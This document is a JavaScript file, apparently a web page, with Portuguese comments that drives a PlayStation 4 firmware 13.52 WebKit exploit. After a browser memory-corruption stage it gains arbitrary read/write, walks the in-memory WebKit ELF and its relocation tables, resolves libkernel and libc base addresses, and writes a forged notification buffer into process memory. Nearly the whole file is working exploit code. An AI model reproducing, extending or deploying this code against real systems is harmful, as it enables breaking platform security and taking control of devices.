// ═════════════════════════════════════════════════════════════════════════════
// RESOLUÇÃO DINÂMICA DE BASES VIA PARSING ELF (v4 - API mem.js corrigida)
// ═════════════════════════════════════════════════════════════════════════════
// API do mem.js: read1, read2, read4, read8, write1, write2, write4, write8, leakval
// NÃO use read32/read16/read64/write32/write64 — esses NÃO EXISTEM!
// read8 retorna int64; read4/read2/read1 retornam número (unsigned)
// ═════════════════════════════════════════════════════════════════════════════

async function resolveAllBases(p, webkitBase) {
  logH('PARSING ELF DO WEBKIT (v4)');

  try {
    // ─── Passo 1: Verificar ELF magic ───
    log('[dbg] Lendo ELF magic em 0x' + webkitBase.toString(16) + '...');
    let magic = p.read4(webkitBase);
    log('[dbg] magic = 0x' + magic.toString(16));
    if (magic !== 0x464C457F) {
      log('[-] WebKit base não aponta para ELF válido! magic=0x' + magic.toString(16), 'e');
      return null;
    }
    log('[+] ELF magic válido (\x7fELF)');

    // ─── Passo 2: Ler e_ident ───
    let ei_class = p.read1(webkitBase.add32(0x04));
    let ei_data  = p.read1(webkitBase.add32(0x05));
    log('[dbg] EI_CLASS=' + ei_class + ' (2=ELF64), EI_DATA=' + ei_data + ' (1=little)');
    if (ei_class !== 2 || ei_data !== 1) {
      log('[-] Formato ELF inesperado', 'e');
      return null;
    }

    // ─── Passo 3: e_type e e_machine ───
    let e_type = p.read2(webkitBase.add32(0x10));
    let e_machine = p.read2(webkitBase.add32(0x12));
    log('[dbg] e_type=' + e_type + ' e_machine=' + e_machine);

    // ─── Passo 4: Program headers ───
    let e_phoff = p.read8(webkitBase.add32(0x20));
    let e_phentsize = p.read2(webkitBase.add32(0x36));
    let e_phnum = p.read2(webkitBase.add32(0x38));
    log('[dbg] e_phoff=0x' + e_phoff.toString(16) + ' e_phentsize=' + e_phentsize + ' e_phnum=' + e_phnum);

    if (e_phnum === 0 || e_phnum > 64) {
      log('[-] e_phnum suspeito: ' + e_phnum, 'w');
    }

    let phoff = webkitBase.add32(e_phoff.low);
    log('[+] phoff abs = 0x' + phoff.toString(16));

    // ─── Passo 5: Encontrar PT_DYNAMIC ───
    let dynamicVaddr_abs = null;
    let dynamicSize = 0;
    let phFound = 0;

    for (let i = 0; i < e_phnum && i < 64; i++) {
      let phAddr = phoff.add32(i * e_phentsize);
      let p_type = p.read4(phAddr);
      if (p_type === 2) { // PT_DYNAMIC
        let p_vaddr_rel = p.read8(phAddr.add32(0x10));
        dynamicSize = p.read8(phAddr.add32(0x28)).low;
        dynamicVaddr_abs = webkitBase.add32(p_vaddr_rel.low);
        log('[+] PT_DYNAMIC[' + i + ']: rel=0x' + p_vaddr_rel.toString(16) +
            ' abs=0x' + dynamicVaddr_abs.toString(16) +
            ' size=0x' + dynamicSize.toString(16));
        phFound++;
      }
    }

    if (!dynamicVaddr_abs) {
      log('[-] PT_DYNAMIC não encontrado', 'e');
      return null;
    }
    if (phFound > 1) {
      log('[!] Múltiplos PT_DYNAMIC (' + phFound + '), usando o primeiro', 'w');
    }

    // ─── Passo 6: Parsear dynamic section ───
    log('[dbg] Parse dynamic...');
    let strtab_abs = null, symtab_abs = null, jmprel_abs = null, pltrelsz = 0;
    let dt_entries = 0;
    const MAX_DT = 256;

    for (let off = 0; off < dynamicSize && dt_entries < MAX_DT; off += 16) {
      let entry = dynamicVaddr_abs.add32(off);
      let tag = p.read8(entry).low;
      let val_raw = p.read8(entry.add32(8));
      dt_entries++;

      if (tag === 5)  { strtab_abs = webkitBase.add32(val_raw.low); }
      if (tag === 6)  { symtab_abs = webkitBase.add32(val_raw.low); }
      if (tag === 23) { jmprel_abs = webkitBase.add32(val_raw.low); }
      if (tag === 2)  { pltrelsz = val_raw.low; }
      if (tag === 0)  { break; }
    }
    log('[dbg] DT entries: ' + dt_entries);
    log('[+] strtab=0x' + (strtab_abs ? strtab_abs.toString(16) : 'null'));
    log('[+] symtab=0x' + (symtab_abs ? symtab_abs.toString(16) : 'null'));
    log('[+] jmprel=0x' + (jmprel_abs ? jmprel_abs.toString(16) : 'null') + ' pltrelsz=' + pltrelsz);

    if (!strtab_abs || !symtab_abs || !jmprel_abs) {
      log('[-] Dynamic incompleto — formato SCE?', 'w');
      return trySceImportScan(p, webkitBase);
    }

    // ─── Passo 7: Varredura RELA ───
    let imports = {};
    let numRela = Math.floor(pltrelsz / 24);
    log('[+] Varrendo ' + numRela + ' entradas RELA...');

    if (numRela > 10000) {
      log('[!] numRela grande (' + numRela + '), limitando a 10000', 'w');
      numRela = 10000;
    }

    for (let i = 0; i < numRela; i++) {
      let rela = jmprel_abs.add32(i * 24);
      let r_offset_rel = p.read8(rela);
      let r_info = p.read8(rela.add32(8)).low;
      let symIdx = (r_info >>> 32) & 0xFFFFFFFF;

      let r_offset_abs = webkitBase.add32(r_offset_rel.low);
      let st_name = p.read4(symtab_abs.add32(symIdx * 24));
      let strAddr = strtab_abs.add32(st_name);

      let name = '';
      for (let j = 0; j < 256; j++) {
        let ch = p.read1(strAddr.add32(j));
        if (ch === 0) break;
        name += String.fromCharCode(ch);
      }

      if (name.length > 0) {
        let importPtr = p.read8(r_offset_abs);
        imports[name] = {
          wkOffset: r_offset_rel,
          importPtr: importPtr,
          r_offset_abs: r_offset_abs
        };
      }
    }
    log('[+] ' + Object.keys(imports).length + ' imports parseados');

    // ─── Passo 8: Logar úteis ───
    let useful = ['memset','memcpy','strcmp','strlen','pthread_create',
                  '__stack_chk_guard','sceKernelDlsym','sceKernelSendNotificationRequest',
                  'sceKernelGetpid','sceKernelUsleep'];
    for (let name of useful) {
      if (imports[name]) {
        let ip = imports[name].importPtr;
        let wo = imports[name].wkOffset;
        let isSys = (ip.hi >= 0x80 && ip.hi <= 0x9F);
        log('    ' + name + ': wkOff=0x' + wo.toString(16) +
            ' ptr=0x' + ip.toString(16) +
            ' sys=' + isSys, isSys ? 'd' : 'w');
      }
    }

    // ─── Passo 9: Resolver bases ───
    let libkernelBase = null;
    let libcBase = null;

    function findElfBase(p, startPtr, maxBack) {
      for (let back = 0; back < maxBack; back += 0x1000) {
        try {
          let test = startPtr.sub32(back);
          if (p.read4(test) === 0x464C457F) {
            return test;
          }
        } catch(e) {}
      }
      return null;
    }

    let lkRef = imports['__stack_chk_guard'] || imports['sceKernelGetpid'] || imports['sceKernelUsleep'];
    if (lkRef) {
      let ptr = lkRef.importPtr;
      log('[dbg] lkRef.ptr = 0x' + ptr.toString(16));
      if (ptr.hi >= 0x80 && ptr.hi <= 0x9F) {
        libkernelBase = findElfBase(p, ptr, 0x200000);
        if (libkernelBase) {
          log('[+] libkernel: 0x' + libkernelBase.toString(16), 'ok');
          setCard('c-lk', '0x' + libkernelBase.toString(16));
        } else {
          log('[-] Scan libkernel falhou', 'w');
        }
      } else {
        log('[-] lkRef fora do range: 0x' + ptr.toString(16), 'w');
      }
    } else {
      log('[-] Nenhum import de libkernel', 'w');
    }

    if (imports['memset']) {
      let ptr = imports['memset'].importPtr;
      log('[dbg] memset.ptr = 0x' + ptr.toString(16));
      if (ptr.hi >= 0x80 && ptr.hi <= 0x9F) {
        libcBase = findElfBase(p, ptr, 0x200000);
        if (libcBase) {
          log('[+] libc: 0x' + libcBase.toString(16), 'ok');
          setCard('c-lc', '0x' + libcBase.toString(16));
        } else {
          log('[-] Scan libc falhou', 'w');
        }
      } else {
        log('[-] memset fora do range: 0x' + ptr.toString(16), 'w');
      }
    }

    return { imports, libkernelBase, libcBase };

  } catch (err) {
    log('[-] EXCEÇÃO: ' + err.name + ': ' + err.message, 'e');
    return null;
  }
}

// ═════════════════════════════════════════════════════════════════════════════
// FALLBACK: SCE Import Scan
// ═════════════════════════════════════════════════════════════════════════════

async function trySceImportScan(p, webkitBase) {
  logH('FALLBACK: SCE IMPORT SCAN');
  log('[!] ELF standard falhou. Tentando scan SCE...');

  let imports = {};
  let candidates = [];
  const MAX_SCAN = 0x800000;
  let found = 0;

  log('[dbg] Varrendo WebKit...');
  for (let off = 0; off < MAX_SCAN && found < 200; off += 0x8) {
    try {
      let ptr = p.read8(webkitBase.add32(off));
      if (ptr.hi >= 0x80 && ptr.hi <= 0x9F && (ptr.low & 0xF) === 0) {
        let b0 = p.read1(ptr);
        if (b0 !== 0x00 && b0 !== 0xCC && b0 !== 0xFF) {
          candidates.push({ off: off, ptr: ptr });
          found++;
        }
      }
    } catch(e) {}
  }

  log('[+] ' + candidates.length + ' candidatos');

  let libkernelBase = null;
  let libcBase = null;

  for (let cand of candidates) {
    if (libkernelBase && libcBase) break;
    try {
      let base = findElfBaseFromPtr(p, cand.ptr);
      if (!base) continue;

      if (!libkernelBase) {
        let stubs = countSyscallStubs(p, base, 0x100000);
        if (stubs >= 10) {
          libkernelBase = base;
          log('[+] libkernel (' + stubs + ' stubs): 0x' + base.toString(16), 'ok');
          setCard('c-lk', '0x' + base.toString(16));
          continue;
        }
      }

      if (!libcBase) {
        let b0 = p.read1(base.add32(0x1000));
        if (b0 !== 0x00 && b0 !== 0xCC) {
          libcBase = base;
          log('[+] libc candidata: 0x' + base.toString(16), 'ok');
          setCard('c-lc', '0x' + base.toString(16));
        }
      }
    } catch(e) {}
  }

  return { imports, libkernelBase, libcBase };
}

function findElfBaseFromPtr(p, ptr) {
  for (let back = 0; back < 0x200000; back += 0x1000) {
    try {
      let test = ptr.sub32(back);
      if (p.read4(test) === 0x464C457F) {
        return test;
      }
    } catch(e) {}
  }
  return null;
}

function countSyscallStubs(p, base, maxOff) {
  let count = 0;
  for (let off = 0; off < maxOff && count < 50; off += 0x10) {
    try {
      let b0 = p.read1(base.add32(off));
      let b1 = p.read1(base.add32(off + 1));
      let b2 = p.read1(base.add32(off + 2));
      if (b0 === 0x48 && b1 === 0xC7 && b2 === 0xC0) {
        let b7 = p.read1(base.add32(off + 7));
        let b8 = p.read1(base.add32(off + 8));
        let b9 = p.read1(base.add32(off + 9));
        if (b7 === 0x49 && b8 === 0x89 && b9 === 0xCA) {
          count++;
        }
      }
    } catch(e) {}
  }
  return count;
}

// ═════════════════════════════════════════════════════════════════════════════
// VALIDAÇÃO
// ═════════════════════════════════════════════════════════════════════════════

async function validateBases(p, libkernelBase, libcBase, imports) {
  logH('VALIDANDO BASES');
  let valid = { libkernel: false, libc: false };

  if (libkernelBase) {
    try {
      let magic = p.read4(libkernelBase);
      if (magic === 0x464C457F) {
        log('[✓] libkernel: ELF magic OK', 'ok');
        valid.libkernel = true;
      } else {
        log('[✗] libkernel: magic inválido (0x' + magic.toString(16) + ')', 'e');
      }
    } catch(e) {
      log('[✗] libkernel: erro ao ler magic', 'e');
    }
  }

  if (libcBase) {
    try {
      let magic = p.read4(libcBase);
      if (magic === 0x464C457F) {
        log('[✓] libc: ELF magic OK', 'ok');
        valid.libc = true;
      } else {
        log('[✗] libc: magic inválido (0x' + magic.toString(16) + ')', 'e');
      }
    } catch(e) {
      log('[✗] libc: erro ao ler magic', 'e');
    }
  }

  if (libkernelBase && valid.libkernel) {
    let foundStubs = countSyscallStubs(p, libkernelBase, 0x100000);
    if (foundStubs >= 3) {
      log('[✓] libkernel: ' + foundStubs + ' stubs', 'ok');
    } else {
      log('[✗] libkernel: poucos stubs (' + foundStubs + ')', 'w');
      valid.libkernel = false;
    }
  }

  if (libkernelBase) {
    let aligned = (libkernelBase.low & 0xFFF) === 0;
    log(aligned ? '[✓] libkernel: alinhada' : '[✗] libkernel: NÃO alinhada', aligned ? 'ok' : 'w');
    if (!aligned) valid.libkernel = false;
  }
  if (libcBase) {
    let aligned = (libcBase.low & 0xFFF) === 0;
    log(aligned ? '[✓] libc: alinhada' : '[✗] libc: NÃO alinhada', aligned ? 'ok' : 'w');
    if (!aligned) valid.libc = false;
  }

  return valid;
}

// ═════════════════════════════════════════════════════════════════════════════
// NOTIFICAÇÃO
// ═════════════════════════════════════════════════════════════════════════════

function prepareNotification(p, libkernelBase, imports, text) {
  logH('PREPARANDO NOTIFICAÇÃO');

  let notifyImport = imports['sceKernelSendNotificationRequest'];
  if (!notifyImport) {
    log('[-] sceKernelSendNotificationRequest não encontrado!', 'e');
    return null;
  }

  let notifyFunc = notifyImport.importPtr;
  log('[+] Target: 0x' + notifyFunc.toString(16));

  let encoder = new TextEncoder();
  let msgBytes = encoder.encode(text + '\x00');

  let buf = new Uint8Array(0x400);
  buf[4] = 0;
  buf.set(msgBytes, 0x20);

  let arrCell = p.leakval(buf);
  let backingStore = p.read8(arrCell.add32(0x10));

  p.write8(backingStore.add32(0x8), backingStore.add32(0x20));
  p.write4(backingStore.add32(0x10), msgBytes.length);

  log('[+] Buffer: 0x' + backingStore.toString(16), 'ok');

  return { notifyFunc, requestBuffer: backingStore };
}

async function main() {
  const ua = navigator.userAgent;
  const fw = /PlayStation 4\/(\d+\.\d+)/.exec(ua);
  $fw.textContent = fw ? `PlayStation 4 — firmware ${fw[1]}` : `UA: ${ua.slice(0, 40)}`;
  log('UA: ' + ua, 'd');

  setStatus('Rodando exploit JSC...', 'r');
  logH('EXPLOIT JSC (WebKit)');

  let carrier;
  try {
    carrier = await establishPrimitive({
      onEvent: (tag, detail, attempt) => {
        document.getElementById('ba').textContent = 'tentativa: ' + (attempt || 1);
        document.getElementById('bg').textContent = 'estágio: ' + tag.toLowerCase();
        log(`[${tag}] ${detail}`, 'i');
      },
      maxAttempts: 0
    });
  } catch (err) {
    setStatus('core.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }

  log('[+] core.js: OK!', 'ok');
  setStatus('Instalando R/W...', 'r');
  logH('INSTALANDO PRIMITIVA R/W (mem.js)');

  let p;
  try {
    p = installWindowP(carrier, {
      promote: true,
      onEvent: (tag, detail) => {
        log(`  [mem/${tag}] ${detail}`, 'd');
      }
    });
  } catch (err) {
    setStatus('mem.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }

  log('[+] R/W instalado!', 'ok');
  setStatus('Mapeando bases...', 'r');
  logH('MAPEAMENTO 13.52 (v4)');

  const ctor = globalThis.__ps5NativeCtor;
  if (typeof ctor === 'number' && ctor > 0x100000000) {
    const hi = Math.floor(ctor / 0x100000000);
    const lo = ctor - hi * 0x100000000;
    const ctorInt64 = new int64(lo >>> 0, hi >>> 0);

    log('[+] __ps5NativeCtor: 0x' + ctorInt64.toString(16), 'a');

    const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined')
               ? OFFSET_wk_host_constructor_candidates[0]
               : 0x36F9E20;

    const resolvedBaseVal = ctor - hc;
    const baseHi = Math.floor(resolvedBaseVal / 0x100000000);
    const baseLo = resolvedBaseVal - baseHi * 0x100000000;
    const webkitBase = new int64(baseLo >>> 0, baseHi >>> 0);

    log('[+] WebKit Base: 0x' + webkitBase.toString(16), 'ok');
    setCard('c-wk', '0x' + webkitBase.toString(16));

    setTimeout(async () => {
      const result = await resolveAllBases(p, webkitBase);
      if (!result) {
        setStatus('Falha na resolução', 'e');
        return;
      }

      const imports = result.imports;
      const libKernelBase = result.libkernelBase;
      const libcBase = result.libcBase;

      const valid = await validateBases(p, libKernelBase, libcBase, imports);

      if (!valid.libkernel) {
        setCard('c-lk', 'Falha');
        log('[-] libkernel não validou', 'e');
      }
      if (!valid.libc) {
        setCard('c-lc', 'Falha');
        log('[-] libc não validou', 'e');
      }

      if (valid.libkernel) {
        try {
          const notif = prepareNotification(p, libKernelBase, imports, 'Hello from PS4 13.52!');
          if (notif) {
            setCard('c-g', 'Pronto');
            setStatus('Notificação pronta!', 'ok');
            log('[✓] OK.', 'ok');

            const cbox = document.getElementById('cbox');
            cbox.style.display = 'block';
            document.getElementById('c-out').textContent =
                'WebKit Base     = 0x' + webkitBase.toString(16) + '\n' +
                'libkernel Base  = 0x' + (libKernelBase ? libKernelBase.toString(16) : 'N/A') + '\n' +
                'libSceLibc Base = ' + (libcBase ? '0x' + libcBase.toString(16) : 'N/A') + '\n' +
                'Buffer Notif    = 0x' + notif.requestBuffer.toString(16) + '\n' +
                'Função Target   = 0x' + notif.notifyFunc.toString(16);

            logH('NOTIFICAÇÃO');
            log('[+] Offset: 0x' + imports['sceKernelSendNotificationRequest'].wkOffset.toString(16), 'i');
            log('[!] ROP não implementado', 'w');
          }
        } catch (e) {
          log('[-] Erro: ' + e.message, 'e');
        }
      } else {
        setCard('c-g', 'Falha LK');
        log('[-] libkernel não resolvida.', 'e');
      }
    }, 500);

  } else {
    log('[-] __ps5NativeCtor inválido.', 'e');
    setStatus('Erro NativeCtor', 'e');
  }
}

main();
</script>
